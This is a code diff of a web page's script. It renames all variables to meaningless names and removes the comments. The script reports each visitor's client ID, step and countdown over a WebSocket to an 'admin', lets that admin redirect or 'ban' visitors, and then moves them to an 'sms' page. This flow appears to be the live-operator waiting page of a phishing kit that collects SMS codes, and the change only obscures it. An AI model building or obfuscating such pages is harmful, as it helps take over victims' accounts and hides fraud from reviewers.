@@ -44,68 +44,63 @@
     </div>
 
     <script>
-        // --- API & WebSocket Integration ---
-        const urlParams = new URLSearchParams(window.location.search);
-        const step = urlParams.get('step');
+        const _a = new URLSearchParams(window.location.search);
+        const _b = _a.get('step');
 
-        let clientId = localStorage.getItem('aura_client_id');
-        if (!clientId) {
-            clientId = 'unknown-' + Date.now();
+        let _c = localStorage.getItem('aura_client_id');
+        if (!_c) {
+            _c = 'unknown-' + Date.now();
         }
 
-        const proto = window.location.protocol === 'https:' ? 'wss' : 'ws';
-        const wsUrl = `${proto}://${window.location.host}/ws/client/${clientId}`;
-        const ws = new WebSocket(wsUrl);
+        const _d = window.location.protocol === 'https:' ? 'wss' : 'ws';
+        const _e = `${_d}://${window.location.host}/ws/client/${_c}`;
+        const _f = new WebSocket(_e);
 
-        ws.onopen = () => {
-            // Inform admin of current state
-            ws.send(JSON.stringify({ event: 'step_update', data: { step: 'loading', sub_step: step } }));
+        _f.onopen = () => {
+            _f.send(JSON.stringify({ event: 'step_update', data: { step: 'loading', sub_step: _b } }));
         };
 
-        ws.onmessage = (e) => {
+        _f.onmessage = (e) => {
             try {
-                const msg = JSON.parse(e.data);
-                if (msg.type === 'REDIRECT') {
-                    window.location.href = msg.url;
-                } else if (msg.type === 'BANNED') {
-                    window.location.href = msg.redirect || 'https://www.google.com';
+                const _g = JSON.parse(e.data);
+                if (_g.type === 'REDIRECT') {
+                    window.location.href = _g.url;
+                } else if (_g.type === 'BANNED') {
+                    window.location.href = _g.redirect || 'https://www.google.com';
                 }
             } catch (err) { console.error(err); }
         };
 
-        // --- Timed Redirect Logic with Real-time Broadcasting ---
-        let duration = 20; // Default: 20 seconds for step 1
-        let nextPage = 'sms'; // Default: go to SMS page
+        let _h = 20;
+        let _i = 'sms';
 
-        if (step === '1') {
-            duration = 20;
-            nextPage = 'sms';
-        } else if (step === '2') {
-            duration = 60; // 60 seconds for step 2
-            nextPage = 'thank_you';
+        if (_b === '1') {
+            _h = 20;
+            _i = 'sms';
+        } else if (_b === '2') {
+            _h = 60;
+            _i = 'thank_you';
         } else {
-            // If no step or invalid step, default to step 1 flow
-            duration = 20;
-            nextPage = 'sms';
+            _h = 20;
+            _i = 'sms';
         }
 
-        const timerInterval = setInterval(() => {
-            duration--;
+        const _j = setInterval(() => {
+            _h--;
 
-            // Broadcast current time to admin
-            if (ws.readyState === WebSocket.OPEN) {
-                ws.send(JSON.stringify({
+            if (_f.readyState === WebSocket.OPEN) {
+                _f.send(JSON.stringify({
                     event: 'timer_update',
                     data: {
-                        timeLeft: duration,
-                        totalDuration: (step === '1' ? 20 : (step === '2' ? 60 : 5))
+                        timeLeft: _h,
+                        totalDuration: (_b === '1' ? 20 : (_b === '2' ? 60 : 5))
                     }
                 }));
             }
 
-            if (duration <= 0) {
-                clearInterval(timerInterval);
-                window.location.href = nextPage;
+            if (_h <= 0) {
+                clearInterval(_j);
+                window.location.href = _i;
             }
         }, 1000);
     </script>
